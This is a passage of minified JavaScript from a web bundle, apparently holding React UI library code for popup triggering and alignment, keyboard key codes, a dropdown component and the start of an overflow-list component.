b.createElement("div",{ref:R(e,t,s),className:l,style:{"--arrow-x":`${g.x||0}px`,"--arrow-y":`${g.y||0}px`,...er,...en,...n,boxSizing:"border-box",zIndex:T,...i},onMouseEnter:I,onMouseLeave:M,onPointerEnter:A,onClick:p,onPointerDownCapture:D},f&&b.createElement(iR,{prefixCls:a,arrow:f,arrowPos:g,align:h}),b.createElement(iL,{cache:!c&&!d},U))})),P)}),iF=b.createContext(null),ij=b.createContext(null);function iH(e){return e?Array.isArray(e)?e:[e]:[]}let iB=e=>{if(!e)return!1;if(e instanceof Element){if(e.offsetParent)return!0;if(e.getBBox){let{width:t,height:r}=e.getBBox();if(t||r)return!0}if(e.getBoundingClientRect){let{width:t,height:r}=e.getBoundingClientRect();if(t||r)return!0}}return!1};function iz(e,t,r,n){let{points:o}=r,a=Object.keys(e);for(let r=0;r<a.length;r+=1){let i=a[r];if(function(e=[],t=[],r){let n=(e,t)=>e[t]||"";return r?n(e,0)===n(t,0):n(e,0)===n(t,0)&&n(e,1)===n(t,1)}(e[i]?.points,o,n))return`${t}-placement-${i}`}return""}function iV(e){return e.ownerDocument.defaultView}function iW(e){let t=[],r=e?.parentElement,n=["hidden","scroll","clip","auto"];for(;r;){let{overflowX:e,overflowY:o,overflow:a}=iV(r).getComputedStyle(r);[e,o,a].some(e=>n.includes(e))&&t.push(r),r=r.parentElement}return t}function iU(e,t=1){return Number.isNaN(e)?t:e}function iq(e){return iU(parseFloat(e),0)}function iG(e,t){let r={...e};return(t||[]).forEach(e=>{if(e instanceof HTMLBodyElement||e instanceof HTMLHtmlElement)return;let{overflow:t,overflowClipMargin:n,borderTopWidth:o,borderBottomWidth:a,borderLeftWidth:i,borderRightWidth:s}=iV(e).getComputedStyle(e),l=e.getBoundingClientRect(),{offsetHeight:c,clientHeight:u,offsetWidth:d,clientWidth:p}=e,m=iq(o),f=iq(a),g=iq(i),h=iq(s),b=iU(Math.round(l.width/d*1e3)/1e3),y=iU(Math.round(l.height/c*1e3)/1e3),v=m*y,S=g*b,x=0,C=0;if("clip"===t){let e=iq(n);x=e*b,C=e*y}let w=l.x+S-x,k=l.y+v-C,$=w+l.width+2*x-S-h*b-(d-p-g-h)*b,E=k+l.height+2*C-v-f*y-(c-u-m-f)*y;r.left=Math.max(r.left,w),r.top=Math.max(r.top,k),r.right=Math.min(r.right,$),r.bottom=Math.min(r.bottom,E)}),r}function iJ(e,t=0){let r=`${t}`,n=r.match(/^(.*)\%$/);return n?e*(parseFloat(n[1])/100):parseFloat(r)}function iX(e,t){let[r,n]=t||[];return[iJ(e.width,r),iJ(e.height,n)]}function iK(e=""){return[e[0],e[1]]}function iQ(e,t){let r,n=t[0],o=t[1];return r="t"===n?e.y:"b"===n?e.y+e.height:e.y+e.height/2,{x:"l"===o?e.x:"r"===o?e.x+e.width:e.x+e.width/2,y:r}}function iY(e,t){let r=[...e];return r[t]=({t:"b",b:"t",l:"r",r:"l"})[e[t]]||"c",r}e.s(["default",0,iB],43022);function iZ(e,t,r,n,o,a,i,s){let[l,c]=b.useState({ready:!1,offsetX:0,offsetY:0,offsetR:0,offsetB:0,arrowX:0,arrowY:0,scaleX:1,scaleY:1,align:o[n]||{}}),u=b.useRef(0),d=b.useMemo(()=>!t||s?[]:iW(t),[t]),p=b.useRef({});e||(p.current={});let m=y(()=>{if(t&&r&&e&&!s){let e,s,m,f,g,h=t.ownerDocument,b=iV(t),{position:y}=b.getComputedStyle(t),v=t.style.left,S=t.style.top,x=t.style.right,C=t.style.bottom,w=t.style.overflow,k={...o[n],...a},$=h.createElement("div");if(t.parentElement?.appendChild($),$.style.left=`${t.offsetLeft}px`,$.style.top=`${t.offsetTop}px`,$.style.position=y,$.style.height=`${t.offsetHeight}px`,$.style.width=`${t.offsetWidth}px`,t.style.left="0",t.style.top="0",t.style.right="auto",t.style.bottom="auto",t.style.overflow="hidden",Array.isArray(r))e={x:r[0],y:r[1],width:0,height:0};else{let t=r.getBoundingClientRect();t.x=t.x??t.left,t.y=t.y??t.top,e={x:t.x,y:t.y,width:t.width,height:t.height}}let E=t.getBoundingClientRect(),{height:P,width:T}=b.getComputedStyle(t);E.x=E.x??E.left,E.y=E.y??E.top;let{clientWidth:I,clientHeight:M,scrollWidth:R,scrollHeight:A,scrollTop:D,scrollLeft:L}=h.documentElement,_=E.height,O=E.width,N=e.height,F=e.width,{htmlRegion:j}=k,H="visible",B="visibleFirst";"scroll"!==j&&j!==B&&(j=H);let z=j===B,V=iG({left:-L,top:-D,right:R-L,bottom:A-D},d),W=iG({left:0,top:0,right:I,bottom:M},d),U=j===H?W:V,q=z?W:U;t.style.left="auto",t.style.top="auto",t.style.right="0",t.style.bottom="0";let G=t.getBoundingClientRect();t.style.left=v,t.style.top=S,t.style.right=x,t.style.bottom=C,t.style.overflow=w,t.parentElement?.removeChild($);let J=iU(Math.round(O/parseFloat(T)*1e3)/1e3),X=iU(Math.round(_/parseFloat(P)*1e3)/1e3);if(0===J||0===X||aE(r)&&!iB(r))return;let{offset:K,targetOffset:Q}=k,[Y,Z]=iX(E,K),[ee,et]=iX(e,Q);e.x-=ee,e.y-=et;let[er,en]=k.points||[],eo=iK(en),ea=iK(er),ei=iQ(e,eo),es=iQ(E,ea),el={...k},ec=[ea,eo],eu=ei.x-es.x+Y,ed=ei.y-es.y+Z;function l(e,t,r=U){let n=E.x+e,o=E.y+t,a=Math.max(n,r.left),i=Math.max(o,r.top);return Math.max(0,(Math.min(n+O,r.right)-a)*(Math.min(o+_,r.bottom)-i))}let ep=l(eu,ed),em=l(eu,ed,W),ef=iQ(e,["t","l"]),eg=iQ(E,["t","l"]),eh=iQ(e,["b","r"]),eb=iQ(E,["b","r"]),{adjustX:ey,adjustY:ev,shiftX:eS,shiftY:ex}=k.overflow||{},eC=e=>"boolean"==typeof e?e:e>=0;function u(){m=(s=E.y+ed)+_,g=(f=E.x+eu)+O}u();let ew=eC(ev),ek=ea[0]===eo[0];if(ew&&"t"===ea[0]&&(m>q.bottom||p.current.bt)){let e=ed;ek?e-=_-N:e=ef.y-eb.y-Z;let t=l(eu,e),r=l(eu,e,W);t>ep||t===ep&&(!z||r>=em)?(p.current.bt=!0,ed=e,Z=-Z,ec=[iY(ec[0],0),iY(ec[1],0)]):p.current.bt=!1}if(ew&&"b"===ea[0]&&(s<q.top||p.current.tb)){let e=ed;ek?e+=_-N:e=eh.y-eg.y-Z;let t=l(eu,e),r=l(eu,e,W);t>ep||t===ep&&(!z||r>=em)?(p.current.tb=!0,ed=e,Z=-Z,ec=[iY(ec[0],0),iY(ec[1],0)]):p.current.tb=!1}let e$=eC(ey),eE=ea[1]===eo[1];if(e$&&"l"===ea[1]&&(g>q.right||p.current.rl)){let e=eu;eE?e-=O-F:e=ef.x-eb.x-Y;let t=l(e,ed),r=l(e,ed,W);t>ep||t===ep&&(!z||r>=em)?(p.current.rl=!0,eu=e,Y=-Y,ec=[iY(ec[0],1),iY(ec[1],1)]):p.current.rl=!1}if(e$&&"r"===ea[1]&&(f<q.left||p.current.lr)){let e=eu;eE?e+=O-F:e=eh.x-eg.x-Y;let t=l(e,ed),r=l(e,ed,W);t>ep||t===ep&&(!z||r>=em)?(p.current.lr=!0,eu=e,Y=-Y,ec=[iY(ec[0],1),iY(ec[1],1)]):p.current.lr=!1}el.points=[ec[0].join(""),ec[1].join("")],u();let eP=!0===eS?0:eS;"number"==typeof eP&&(f<W.left&&(eu-=f-W.left-Y,e.x+F<W.left+eP&&(eu+=e.x-W.left+F-eP)),g>W.right&&(eu-=g-W.right-Y,e.x>W.right-eP&&(eu+=e.x-W.right+eP)));let eT=!0===ex?0:ex;"number"==typeof eT&&(s<W.top&&(ed-=s-W.top-Z,e.y+N<W.top+eT&&(ed+=e.y-W.top+N-eT)),m>W.bottom&&(ed-=m-W.bottom-Z,e.y>W.bottom-eT&&(ed+=e.y-W.bottom+eT)));let eI=E.x+eu,eM=E.y+ed,eR=e.x,eA=e.y,eD=Math.max(eI,eR),eL=Math.min(eI+O,eR+F),e_=Math.max(eM,eA),eO=Math.min(eM+_,eA+N);i?.(t,el);let eN=G.right-E.x-(eu+E.width),eF=G.bottom-E.y-(ed+E.height);1===J&&(eu=Math.floor(eu),eN=Math.floor(eN)),1===X&&(ed=Math.floor(ed),eF=Math.floor(eF)),c({ready:!0,offsetX:eu/J,offsetY:ed/X,offsetR:eN/J,offsetB:eF/X,arrowX:((eD+eL)/2-eI)/J,arrowY:((e_+eO)/2-eM)/X,scaleX:J,scaleY:X,align:el})}}),f=()=>{c(e=>({...e,ready:!1}))};return x(f,[n]),x(()=>{e||f()},[e]),[l.ready,l.offsetX,l.offsetY,l.offsetR,l.offsetB,l.arrowX,l.arrowY,l.scaleX,l.scaleY,l.align,()=>{u.current+=1;let e=u.current;Promise.resolve().then(()=>{u.current===e&&m()})}]}function i0(){let e=b.useRef(null),t=()=>{e.current&&(clearTimeout(e.current),e.current=null)};return b.useEffect(()=>()=>{t()},[]),(r,n)=>{t(),0===n?r():e.current=setTimeout(()=>{r()},1e3*n)}}function i1(){return(i1=Object.assign.bind()).apply(this,arguments)}let i2=e=>{let{prefixCls:t,isMobile:r,ready:n,open:o,align:a,offsetR:i,offsetB:s,offsetX:l,offsetY:c,arrowPos:u,popupSize:d,motion:p,uniqueContainerClassName:m,uniqueContainerStyle:f}=e,g=`${t}-unique-container`,[h,y]=b.default.useState(!1),v=i_(r,n,o,a,i,s,l,c),S=b.default.useRef(v);n&&(S.current=v);let x={};return d&&(x.width=d.width,x.height=d.height),b.default.createElement(iC,i1({motionAppear:!0,motionEnter:!0,motionLeave:!0,removeOnLeave:!1,leavedClassName:`${g}-hidden`},p,{visible:o,onVisibleChanged:e=>{y(e)}}),({className:e,style:t})=>{let r=K(g,e,m,{[`${g}-visible`]:h});return b.default.createElement("div",{className:r,style:{"--arrow-x":`${u?.x||0}px`,"--arrow-y":`${u?.y||0}px`,...S.current,...x,...t,...f}})})};e.s(["default",0,({children:e,postTriggerProps:t})=>{let[r,n,o,a]=function(){let[e,t]=b.default.useState(null),[r,n]=b.default.useState(!1),[o,a]=b.default.useState(!1),i=b.default.useRef(null);return[y(e=>{!1===e?(i.current=null,n(!1)):o&&r?i.current=e:(n(!0),t(e),i.current=null,r||a(!0))}),r,e,y(e=>{e?(a(!1),i.current&&(t(i.current),i.current=null)):(a(!1),i.current=null)})]}(),i=b.useMemo(()=>o&&t?t(o):o,[o,t]),[s,l]=b.useState(null),[c,u]=b.useState(null),d=b.useRef(null),p=y(e=>{d.current=e,aE(e)&&s!==e&&l(e)}),m=b.useRef(null),f=i0(),g=y((e,t)=>{m.current=t,f(()=>{r(e)},e.delay)}),h=e=>{f(()=>{m.current?.()||r(!1)},e)},v=y(e=>{a(e)}),[S,x,C,w,k,$,E,,,P,T]=iZ(n,s,i?.target,i?.popupPlacement,i?.builtinPlacements||{},i?.popupAlign,void 0,!1),I=b.useMemo(()=>i?K(iz(i.builtinPlacements||{},i.prefixCls||"",P,!1),i.getPopupClassNameFromAlign?.(P)):"",[P,i?.getPopupClassNameFromAlign,i?.builtinPlacements,i?.prefixCls]),M=b.useMemo(()=>({show:g,hide:h}),[]);b.useEffect(()=>{T()},[i?.target]);let R=y(()=>(T(),Promise.resolve())),A=b.useRef({}),D=b.useContext(iF),L=b.useMemo(()=>({registerSubPopup:(e,t)=>{A.current[e]=t,D?.registerSubPopup(e,t)}}),[D]),_=i?.prefixCls;return b.createElement(ij.Provider,{value:M},e,i&&b.createElement(iF.Provider,{value:L},b.createElement(iN,{ref:p,portal:a6,onEsc:i.onEsc,prefixCls:_,popup:i.popup,className:K(i.popupClassName,I,`${_}-unique-controlled`),style:i.popupStyle,target:i.target,open:n,keepDom:!0,fresh:!0,autoDestroy:!1,onVisibleChanged:v,ready:S,offsetX:x,offsetY:C,offsetR:w,offsetB:k,onAlign:T,onPrepare:R,onResize:e=>u({width:e.offsetWidth,height:e.offsetHeight}),arrowPos:{x:$,y:E},align:P,zIndex:i.zIndex,mask:i.mask,arrow:i.arrow,motion:i.popupMotion,maskMotion:i.maskMotion,getPopupContainer:i.getPopupContainer},b.createElement(i2,{prefixCls:_,isMobile:!1,ready:S,open:n,align:P,offsetR:w,offsetB:k,offsetX:x,offsetY:C,arrowPos:{x:$,y:E},popupSize:c,motion:i.popupMotion,uniqueContainerClassName:K(i.uniqueContainerClassName,I),uniqueContainerStyle:i.uniqueContainerStyle}))))}],42569),e.s(["useControlledState",()=>w],30294);let i3=function(e=a6){return b.forwardRef((t,r)=>{var n;let o,a,i,s,{prefixCls:l="rc-trigger-popup",children:c,action:u="hover",showAction:d,hideAction:p,popupVisible:m,defaultPopupVisible:f,onOpenChange:g,afterOpenChange:h,onPopupVisibleChange:v,afterPopupVisibleChange:S,mouseEnterDelay:C,mouseLeaveDelay:k=.1,focusDelay:$,blurDelay:E,mask:P,maskClosable:T=!0,getPopupContainer:I,forceRender:M,autoDestroy:R,popup:D,popupClassName:L,uniqueContainerClassName:O,uniqueContainerStyle:N,popupStyle:F,popupPlacement:j,builtinPlacements:H={},popupAlign:B,zIndex:z,stretch:V,getPopupClassNameFromAlign:W,fresh:U,unique:q,alignPoint:G,onPopupClick:J,onPopupAlign:X,arrow:Q,popupMotion:Y,maskMotion:Z,mobile:ee,...et}=t,er=void 0===m,en=!!ee,eo=b.useRef({}),ea=b.useContext(iF),ei=b.useMemo(()=>({registerSubPopup:(e,t)=>{eo.current[e]=t,ea?.registerSubPopup(e,t)}}),[ea]),es=b.useContext(ij),el=aY(),[ec,eu]=b.useState(null),ed=b.useRef(null),ep=y(e=>{ed.current=e,aE(e)&&ec!==e&&eu(e),ea?.registerSubPopup(el,e)}),[em,ef]=b.useState(null),eg=b.useRef(null),eh=y(e=>{let t=aP(e);aE(t)&&em!==t&&(ef(t),eg.current=t)}),eb={},ey=y(e=>em?.contains(e)||e3(em)?.host===e||e===em||ec?.contains(e)||e3(ec)?.host===e||e===ec||Object.values(eo.current).some(t=>t?.contains(e)||e===t)),ev=Q?{...!0!==Q?Q:{}}:null,[eS,ex]=w(f||!1,m),eC=eS||!1,ew=b.useMemo(()=>{let e="function"==typeof c?c({open:eC}):c;return b.Children.only(e)},[c,eC]),ek=ew?.props||{},e$=y(()=>eC),eE=y((e=0)=>({popup:D,target:em,delay:e,prefixCls:l,popupClassName:L,uniqueContainerClassName:O,uniqueContainerStyle:N,popupStyle:F,popupPlacement:j,builtinPlacements:H,popupAlign:B,zIndex:z,mask:P,maskClosable:T,popupMotion:Y,maskMotion:Z,arrow:ev,getPopupContainer:I,getPopupClassNameFromAlign:W,id:el,onEsc:eR}));x(()=>{es&&q&&em&&!er&&!ea&&(eC?es.show(eE(C),e$):es.hide(k))},[eC,em]);let eP=b.useRef(eC);eP.current=eC;let eT=y(e=>{(0,aU.flushSync)(()=>{eC!==e&&(ex(e),g?.(e),v?.(e))})}),eI=i0(),eM=(e,t=0)=>{void 0!==m?eI(()=>{eT(e)},t):es&&q&&er&&!ea?e?es.show(eE(t),e$):es.hide(t):eI(()=>{eT(e)},t)};function eR({top:e}){e&&eM(!1)}let[eA,eD]=b.useState(!1);x(e=>{(!e||eC)&&eD(!0)},[eC]);let[eL,e_]=b.useState(null),[eO,eN]=b.useState(null),eF=e=>{eN([e.clientX,e.clientY])},[ej,eH,eB,ez,eV,eW,eU,eq,eG,eJ,eX]=iZ(eC,ec,G&&null!==eO?eO:em,j,H,B,X,en),[eK,eQ]=b.useMemo(()=>{let e=iH(d??u),t=iH(p??u),r=new Set(e),n=new Set(t);return r.has("hover")&&!r.has("click")&&r.add("touch"),n.has("hover")&&!n.has("click")&&n.add("touch"),[r,n]},[u,d,p]),eY=eK.has("click"),eZ=eQ.has("click")||eQ.has("contextMenu"),e0=y(()=>{eA||eX()});x(()=>{if(eC&&em&&ec){let t=iW(em),r=iW(ec),n=iV(ec),o=new Set([n,...t,...r]);function e(){e0(),(()=>{eP.current&&G&&eZ&&eM(!1)})()}return o.forEach(t=>{t.addEventListener("scroll",e,{passive:!0})}),n.addEventListener("resize",e,{passive:!0}),e0(),()=>{o.forEach(t=>{t.removeEventListener("scroll",e),n.removeEventListener("resize",e)})}}},[eC,em,ec]),x(()=>{e0()},[eO,j]),x(()=>{eC&&!H?.[j]&&e0()},[JSON.stringify(B)]);let e1=b.useMemo(()=>K(iz(H,l,eJ,G),W?.(eJ)),[eJ,W,H,l,G]);b.useImperativeHandle(r,()=>({nativeElement:eg.current,popupElement:ed.current,forceAlign:e0}));let[e2,e6]=b.useState(0),[e4,e5]=b.useState(0),e8=()=>{if(V&&em){let e=em.getBoundingClientRect();e6(e.width),e5(e.height)}};function e7(e,t,r,n,o){eb[e]=(a,...i)=>{o&&o()||(n?.(a),eM(t,r)),ek[e]?.(a,...i)}}x(()=>{eL&&(eX(),eL(),e_(null))},[eL]);let e9=eK.has("touch"),te=eQ.has("touch"),tt=b.useRef(!1);(e9||te)&&(eb.onTouchStart=(...e)=>{tt.current=!0,eP.current&&te?eM(!1):!eP.current&&e9&&eM(!0),ek.onTouchStart?.(...e)}),(eY||eZ)&&(eb.onClick=(e,...t)=>{eP.current&&eZ?eM(!1):!eP.current&&eY&&(eF(e),eM(!0)),ek.onClick?.(e,...t),tt.current=!1});let tr=(n=eZ||te,(i=b.useRef(eC)).current=eC,s=b.useRef(!1),b.useEffect(()=>{if(n&&ec&&(!P||T)){let e=()=>{s.current=!1},t=e=>{!i.current||ey(e.composedPath?.()?.[0]||e.target)||s.current||eM(!1)},r=iV(ec);r.addEventListener("pointerdown",e,!0),r.addEventListener("mousedown",t,!0),r.addEventListener("contextmenu",t,!0);let n=e3(em);return n&&(n.addEventListener("mousedown",t,!0),n.addEventListener("contextmenu",t,!0)),()=>{r.removeEventListener("pointerdown",e,!0),r.removeEventListener("mousedown",t,!0),r.removeEventListener("contextmenu",t,!0),n&&(n.removeEventListener("mousedown",t,!0),n.removeEventListener("contextmenu",t,!0))}}},[n,em,ec,P,T]),function(){s.current=!0}),tn=eK.has("hover"),to=eQ.has("hover"),ta=()=>tt.current;if(tn){let e=e=>{eF(e)};e7("onMouseEnter",!0,C,e,ta),e7("onPointerEnter",!0,C,e,ta),o=e=>{(eC||eA)&&ec?.contains(e.target)&&eM(!0,C)},G&&(eb.onMouseMove=e=>{ek.onMouseMove?.(e)})}to&&(e7("onMouseLeave",!1,k,void 0,ta),e7("onPointerLeave",!1,k,void 0,ta),a=()=>{eM(!1,k)}),eK.has("focus")&&e7("onFocus",!0,$),eQ.has("focus")&&e7("onBlur",!1,E),eK.has("contextMenu")&&(eb.onContextMenu=(e,...t)=>{eP.current&&eQ.has("contextMenu")?eM(!1):(eF(e),eM(!0)),e.preventDefault(),ek.onContextMenu?.(e,...t)});let ti=b.useRef(!1);ti.current||=M||eC||eA;let ts={...ek,...eb},tl={};["onContextMenu","onClick","onMouseDown","onTouchStart","onMouseEnter","onMouseLeave","onFocus","onBlur"].forEach(e=>{et[e]&&(tl[e]=(...t)=>{ts[e]?.(...t),et[e](...t)})}),aA(eC,em,()=>{e8(),e0()});let tc=A(eh,_(ew)),tu=b.cloneElement(ew,{...ts,...tl,ref:tc});return b.createElement(b.Fragment,null,tu,ti.current&&(!es||!q)&&b.createElement(iF.Provider,{value:ei},b.createElement(iN,{portal:e,ref:ep,prefixCls:l,popup:D,className:K(L,!en&&e1),style:F,target:em,onMouseEnter:o,onMouseLeave:a,onPointerEnter:o,zIndex:z,open:eC,keepDom:eA,fresh:U,onClick:J,onPointerDownCapture:tr,mask:P,motion:Y,maskMotion:Z,onVisibleChanged:e=>{eD(!1),eX(),h?.(e),S?.(e)},onPrepare:()=>new Promise(e=>{e8(),e_(()=>e)}),forceRender:M,autoDestroy:R||!1,getPopupContainer:I,onEsc:eR,align:eJ,arrow:ev,arrowPos:{x:eW,y:eU},ready:ej,offsetX:eH,offsetY:eB,offsetR:ez,offsetB:eV,onAlign:e0,stretch:V,targetWidth:e2/eq,targetHeight:e4/eG,mobile:ee})))})}(a6);e.s(["default",0,i3],49637);let i6={MAC_ENTER:3,BACKSPACE:8,TAB:9,NUM_CENTER:12,ENTER:13,SHIFT:16,CTRL:17,ALT:18,PAUSE:19,CAPS_LOCK:20,ESC:27,SPACE:32,PAGE_UP:33,PAGE_DOWN:34,END:35,HOME:36,LEFT:37,UP:38,RIGHT:39,DOWN:40,PRINT_SCREEN:44,INSERT:45,DELETE:46,ZERO:48,ONE:49,TWO:50,THREE:51,FOUR:52,FIVE:53,SIX:54,SEVEN:55,EIGHT:56,NINE:57,QUESTION_MARK:63,A:65,B:66,C:67,D:68,E:69,F:70,G:71,H:72,I:73,J:74,K:75,L:76,M:77,N:78,O:79,P:80,Q:81,R:82,S:83,T:84,U:85,V:86,W:87,X:88,Y:89,Z:90,META:91,WIN_KEY_RIGHT:92,CONTEXT_MENU:93,NUM_ZERO:96,NUM_ONE:97,NUM_TWO:98,NUM_THREE:99,NUM_FOUR:100,NUM_FIVE:101,NUM_SIX:102,NUM_SEVEN:103,NUM_EIGHT:104,NUM_NINE:105,NUM_MULTIPLY:106,NUM_PLUS:107,NUM_MINUS:109,NUM_PERIOD:110,NUM_DIVISION:111,F1:112,F2:113,F3:114,F4:115,F5:116,F6:117,F7:118,F8:119,F9:120,F10:121,F11:122,F12:123,NUMLOCK:144,SEMICOLON:186,DASH:189,EQUALS:187,COMMA:188,PERIOD:190,SLASH:191,APOSTROPHE:192,SINGLE_QUOTE:222,OPEN_SQUARE_BRACKET:219,BACKSLASH:220,CLOSE_SQUARE_BRACKET:221,WIN_KEY:224,MAC_FF_META:224,WIN_IME:229,isTextModifyingKeyEvent:function(e){let{keyCode:t}=e;if(e.altKey&&!e.ctrlKey||e.metaKey||t>=i6.F1&&t<=i6.F12)return!1;switch(t){case i6.ALT:case i6.CAPS_LOCK:case i6.CONTEXT_MENU:case i6.CTRL:case i6.DOWN:case i6.END:case i6.ESC:case i6.HOME:case i6.INSERT:case i6.LEFT:case i6.MAC_FF_META:case i6.META:case i6.NUMLOCK:case i6.NUM_CENTER:case i6.PAGE_DOWN:case i6.PAGE_UP:case i6.PAUSE:case i6.PRINT_SCREEN:case i6.RIGHT:case i6.SHIFT:case i6.UP:case i6.WIN_KEY:case i6.WIN_KEY_RIGHT:return!1;default:return!0}},isCharacterKey:function(e){if(e>=i6.ZERO&&e<=i6.NINE||e>=i6.NUM_ZERO&&e<=i6.NUM_MULTIPLY||e>=i6.A&&e<=i6.Z||-1!==window.navigator.userAgent.indexOf("WebKit")&&0===e)return!0;switch(e){case i6.SPACE:case i6.QUESTION_MARK:case i6.NUM_PLUS:case i6.NUM_MINUS:case i6.NUM_PERIOD:case i6.NUM_DIVISION:case i6.SEMICOLON:case i6.DASH:case i6.EQUALS:case i6.COMMA:case i6.PERIOD:case i6.SLASH:case i6.APOSTROPHE:case i6.SINGLE_QUOTE:case i6.OPEN_SQUARE_BRACKET:case i6.BACKSLASH:case i6.CLOSE_SQUARE_BRACKET:return!0;default:return!1}},isEditableTarget:function(e){let t=e.target;if(!(t instanceof HTMLElement))return!1;let r=t.tagName;return"INPUT"===r||"TEXTAREA"===r||"SELECT"===r||!!t.isContentEditable}};e.s(["default",0,i6],30731);let{ESC:i4,TAB:i5}=i6,i8=(0,b.forwardRef)((e,t)=>{let{overlay:r,arrow:n,prefixCls:o}=e,a=(0,b.useMemo)(()=>"function"==typeof r?r():r,[r]),i=R(t,_(a));return b.default.createElement(b.default.Fragment,null,n&&b.default.createElement("div",{className:`${o}-arrow`}),b.default.cloneElement(a,{ref:D(a)?i:void 0}))}),i7={adjustX:1,adjustY:1},i9=[0,0],se={topLeft:{points:["bl","tl"],overflow:i7,offset:[0,-4],targetOffset:i9},top:{points:["bc","tc"],overflow:i7,offset:[0,-4],targetOffset:i9},topRight:{points:["br","tr"],overflow:i7,offset:[0,-4],targetOffset:i9},bottomLeft:{points:["tl","bl"],overflow:i7,offset:[0,4],targetOffset:i9},bottom:{points:["tc","bc"],overflow:i7,offset:[0,4],targetOffset:i9},bottomRight:{points:["tr","br"],overflow:i7,offset:[0,4],targetOffset:i9}};function st(){return(st=Object.assign.bind()).apply(this,arguments)}let sr=b.default.forwardRef((e,t)=>{let{arrow:r=!1,prefixCls:n="rc-dropdown",transitionName:o,animation:a,align:i,placement:s="bottomLeft",placements:l=se,getPopupContainer:c,showAction:u,hideAction:d,overlayClassName:p,overlayStyle:m,visible:f,trigger:g=["hover"],autoFocus:h,overlay:y,children:v,onVisibleChange:S,...x}=e,[C,w]=b.default.useState(),k="visible"in e?f:C,$=a?`${n}-${a}`:o,E=b.default.useRef(null),P=b.default.useRef(null),T=b.default.useRef(null);b.default.useImperativeHandle(t,()=>E.current);let I=e=>{w(e),S?.(e)};!function({visible:e,triggerRef:t,onVisibleChange:r,autoFocus:n,overlayRef:o}){let a=b.useRef(!1),i=()=>{e&&(t.current?.focus?.(),r?.(!1))},s=()=>!!o.current?.focus&&(o.current.focus(),a.current=!0,!0),l=e=>{switch(e.keyCode){case i4:i();break;case i5:{let t=!1;a.current||(t=s()),t?e.preventDefault():i()}}};b.useEffect(()=>e?(window.addEventListener("keydown",l),n&&oU(s,3),()=>{window.removeEventListener("keydown",l),a.current=!1}):()=>{a.current=!1},[e])}({visible:k,triggerRef:T,onVisibleChange:I,autoFocus:h,overlayRef:P});let M=()=>b.default.createElement(i8,{ref:P,overlay:y,prefixCls:n,arrow:r}),A=b.default.cloneElement(v,{className:K(v.props?.className,k&&(()=>{let{openClassName:t}=e;return void 0!==t?t:`${n}-open`})()),ref:D(v)?R(T,_(v)):void 0}),L=d;return L||-1===g.indexOf("contextMenu")||(L=["click"]),b.default.createElement(i3,st({builtinPlacements:l},x,{prefixCls:n,ref:E,popupClassName:K(p,{[`${n}-show-arrow`]:r}),popupStyle:m,action:g,showAction:u,hideAction:L,popupPlacement:s,popupAlign:i,popupMotion:{motionName:$},popupVisible:k,stretch:(()=>{let{minOverlayWidthMatchTrigger:t,alignPoint:r}=e;return"minOverlayWidthMatchTrigger"in e?t:!r})()?"minWidth":"",popup:"function"==typeof y?M:M(),onOpenChange:I,onPopupClick:t=>{let{onOverlayClick:r}=e;w(!1),r&&r(t)},getPopupContainer:c}),A)});function sn(){return(sn=Object.assign.bind()).apply(null,arguments)}e.s(["default",0,sr],28235),e.s(["default",()=>sn],31067);let so,sa=b.forwardRef(function(e,t){let r,{prefixCls:n,invalidate:o,item:a,renderItem:i,responsive:s,responsiveDisabled:l,registerSize:c,itemKey:u,className:d,style:p,children:m,display:f,order:g,component:h="div",...y}=e,v=s&&!f;b.useEffect(()=>()=>{c(u,null)},[]);let S=i&&a!==so?i(a,{index:g}):m;o||(r={opacity:+!v,height:v?0:so,overflowY:v?"hidden":so,order:s?g:so,pointerEvents:v?"none":so,position:v?"absolute":so});let x={};v&&(x["aria-hidden"]=!0);let C=b.createElement(h,sn({className:K(!o&&n,d),style:{...r,...p}},x,y,{ref:t}),S);return s&&(C=b.createElement(a_,{onResize:({offsetWidth:e})=>{c(u,e)},disabled:l},C)),C});function si(e,t){let[r,n]=b.useState(t);return[r,y(t=>{e(()=>{n(t)})})]}let ss=b.default.createContext(null),sl=b.forwardRef((e,t)=>{let r=b.useContext(ss);if(!r){let{component:r="div",...n}=e;return b.createElement(r,sn({},n,{ref:t}))}let{className:n,...o}=r,{className:a,...i}=e;return b.createElement(ss.Provider,{value:null},b.createElement(sa,sn({ref:t,className:K(n,a)},o,i)))}),sc="responsive",su="invalidate";function sd(e){return`+ ${e.length} ...`}let sp=b.forwardRef(function(e,t){let r,{prefixCls:n="rc-overflow",data:o=[],renderItem:a,renderRawItem:i,itemKey:s,itemWidth:l=10,ssr:c,style:u,className:d,maxCount:p,renderRest:m,renderRawRest:f,prefix:g,suffix:h,component:y="div",itemComponent:v,onVisibleChange:S,...C}=e,w="full"===c,k=(r=b.useRef(null),e=>{if(!r.current){r.current=[];var t=()=>{(0,aU.unstable_batchedUpdates)(()=>{r.current.forEach(e=>{e()}),r.current=null})};if("u"<typeof MessageChannel)oU(t);else{let e=new MessageChannel;e.port1.onmessage=()=>t(),e.port2.postMessage(void 0)}}r.current.push(e)}),[$,E]=si(k,null),P=$||0,[T,I]=si(k,new Map),[M,R]=si(k,0),[A,D]=si(k,0),[L,_]=si(k,0),[O,N]=si(k,0),[F,j]=(0,b.useState)(null),[H,B]=(0,b.useState)(null),z=b.useMemo(()=>null===H&&w?Number.MAX_SAFE_INTEGER:H||0,[H,$]),[V,W]=(0,b.useState)(!1),U=`${n}-item`,q=Math.max(M,A),G=p===sc,J=o.length&&G,X=p===su,Q=J||"number"==typeof p&&o.length>p,Y=(0,b.useMemo)(()=>{let e=o;return J?e=null===$&&w?o:o.slice(0,Math.min(o.length,P/l)):"number"==typeof p&&(e=o.slice(0,p)),e},[o,l,$,p,J]),Z=(0,b.useMemo)(()=>J?o.slice(z+1):o.slice(Y.length),[o,Y,J,z]),ee=(0,b.useCallback)((e,t)=>"function"==typeof s?s(e):(s&&e?.[s])??t,[s]),et=(0,b.useCallback)(a||(e=>e),[a]);function er(e,t,r){(H!==e||void 0!==t&&t!==F)&&(B(e),r||(W(e<o.length-1),S?.(e)),void 0!==t&&j(t))}function en(e,t){I(r=>{let n=new Map(r);return null===t?n.delete(e):n.set(e,t),n})}function eo(e){return T.get(ee(Y[e],e))}x(()=>{if(P&&"number"==typeof q&&Y){let e=L+O,t=Y.length,r=t-1;if(!t)return void er(0,null);for(let n=0;n<t;n+=1){let t=eo(n);if(w&&(t=t||0),void 0===t){er(n-1,void 